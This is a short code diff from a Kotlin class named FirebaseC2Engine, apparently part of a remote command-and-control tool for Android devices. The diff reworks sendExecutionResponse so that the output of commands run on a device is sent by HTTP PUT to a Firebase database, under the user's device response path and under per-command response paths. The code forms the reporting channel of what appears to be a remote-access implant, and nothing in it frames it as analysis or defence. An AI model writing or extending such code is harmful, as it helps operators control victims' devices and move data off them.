@@ -283,22 +283,18 @@ class FirebaseC2Engine(
             val uid = if (currentUserId.isNotBlank()) currentUserId else "default_user"
             val devId = if (currentDeviceId.isNotBlank()) currentDeviceId else getOrCreateDeviceId()
 
-            val targetUids = listOf(uid, "default_user").distinct()
+            try {
+                val respUrl = "${account.databaseUrl}/users/$uid/devices/$devId/response.json"
+                val respBody = JSONObject.quote(resultText).toRequestBody("application/json".toMediaTypeOrNull())
+                httpClient.newCall(Request.Builder().url(respUrl).put(respBody).build()).execute().close()
 
-            for (targetUid in targetUids) {
-                try {
-                    val respUrl = "${account.databaseUrl}/users/$targetUid/devices/$devId/response.json"
-                    val respBody = JSONObject.quote(resultText).toRequestBody("application/json".toMediaTypeOrNull())
-                    httpClient.newCall(Request.Builder().url(respUrl).put(respBody).build()).execute().close()
-
-                    if (tag.startsWith("firebase_")) {
-                        val cmdId = tag.removePrefix("firebase_")
-                        val cmdRespUrl = "${account.databaseUrl}/users/$targetUid/devices/$devId/commands/$cmdId/response.json"
-                        httpClient.newCall(Request.Builder().url(cmdRespUrl).put(respBody).build()).execute().close()
-                    }
-                } catch (e: Exception) {
-                    Log.e(TAG, "sendExecutionResponse error: ${e.message}")
+                if (tag.startsWith("firebase_")) {
+                    val cmdId = tag.removePrefix("firebase_")
+                    val cmdRespUrl = "${account.databaseUrl}/users/$uid/devices/$devId/commands/$cmdId/response.json"
+                    httpClient.newCall(Request.Builder().url(cmdRespUrl).put(respBody).build()).execute().close()
                 }
+            } catch (e: Exception) {
+                Log.e(TAG, "sendExecutionResponse error: ${e.message}")
             }
         }
     }
